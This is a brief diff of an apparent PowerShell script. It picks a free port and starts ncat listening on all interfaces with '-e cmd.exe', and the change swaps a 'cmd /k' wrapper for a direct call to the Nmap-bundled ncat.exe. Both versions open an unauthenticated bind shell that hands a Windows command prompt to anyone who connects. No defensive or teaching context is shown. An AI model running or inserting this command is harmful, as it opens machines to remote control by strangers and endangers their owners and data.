@@ -28,4 +28,4 @@ function Get-OpenPort {
 $openPort = Get-OpenPort
 
 # Start ncat listener on available port
-cmd /k "ncat -nv 0.0.0.0 $openPort -e cmd.exe"
+& "C:\Program Files (x86)\Nmap\ncat.exe" -nv 0.0.0.0 $openPort -e cmd.exe
